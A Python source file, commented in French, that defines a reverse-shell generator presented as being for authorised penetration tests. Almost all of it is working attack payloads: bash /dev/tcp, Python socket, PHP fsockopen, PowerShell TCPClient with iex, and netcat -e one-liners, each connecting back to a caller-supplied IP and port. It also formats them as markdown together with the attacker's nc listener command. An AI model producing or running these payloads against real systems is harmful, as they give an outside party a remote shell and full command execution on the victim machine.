"""Générateur de reverse shells pour tests d'intrusion autorisés"""


class ReverseShellGenerator:
    """Génère des reverse shells dans tous les langages"""

    @staticmethod
    def bash(ip: str, port: int) -> str:
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

    @staticmethod
    def python(ip: str, port: int) -> str:
        code = """python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("__IP__",__PORT__))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'"""
        return code.replace("__IP__", ip).replace("__PORT__", str(port))

    @staticmethod
    def php(ip: str, port: int) -> str:
        code = """php -r '$sock=fsockopen("__IP__",__PORT__);exec("/bin/sh -i <&3 >&3 2>&3");'"""
        return code.replace("__IP__", ip).replace("__PORT__", str(port))

    @staticmethod
    def powershell(ip: str, port: int) -> str:
        code = """$client = New-Object System.Net.Sockets.TCPClient('__IP__',__PORT__);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()"""
        return code.replace("__IP__", ip).replace("__PORT__", str(port))

    @staticmethod
    def netcat(ip: str, port: int) -> str:
        return f"nc -e /bin/sh {ip} {port}"

    def all_variants(self, ip: str, port: int) -> str:
        fence = "```"  # variable pour les backticks — aucun dans les chaînes
        lignes = [
            f"## Reverse Shells pour {ip}:{port}",
            "",
            "**Bash:**",
            fence + "bash",
            self.bash(ip, port),
            fence,
            "",
            "**Python:**",
            fence + "python",
            self.python(ip, port),
            fence,
            "",
            "**PHP:**",
            fence + "php",
            self.php(ip, port),
            fence,
            "",
            "**PowerShell:**",
            fence + "powershell",
            self.powershell(ip, port),
            fence,
            "",
            "**Netcat:**",
            fence + "bash",
            self.netcat(ip, port),
            fence,
            "",
            "**Écoute côté attaquant :**",
            fence + "bash",
            f"nc -lvnp {port}",
            fence,
        ]
        return "\n".join(lignes)